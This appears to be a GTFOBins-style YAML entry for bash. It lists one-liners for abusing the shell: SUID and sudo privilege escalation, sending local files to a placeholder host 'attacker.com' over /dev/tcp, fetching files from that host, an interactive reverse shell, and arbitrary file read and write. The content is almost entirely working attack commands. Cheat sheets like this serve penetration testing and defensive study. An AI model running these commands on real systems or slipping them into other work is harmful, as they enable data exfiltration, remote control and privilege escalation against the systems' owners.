---
functions:
  execute-interactive:
    - code: bash
  sudo-enabled:
    - code: sudo bash
  suid-enabled:
    - code: ./bash -p
  upload:
    - description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        bash -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
    - description: Send local file using a TCP connection. Run `nc -l -p 12345 > "where_to_save"` on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_get
        bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
            3<>/dev/tcp/$RHOST/$RPORT \
            | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
    - description: Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.
      code: |-
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_get
        bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
  reverse-shell-interactive:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
  file-read:
    - description: It trims trailing newlines.
      code: |
        export LFILE=file_to_read
        bash -c 'echo "$(<$LFILE)"'
    - description: It trims trailing newlines.
      code: |
        export LFILE=file_to_read
        bash -c $'read -r -d \x04 < "$LFILE"; echo "$REPLY"'
  file-write:
    - code: |
        export LFILE=file_to_write
        bash -c 'echo data > $LFILE'
---
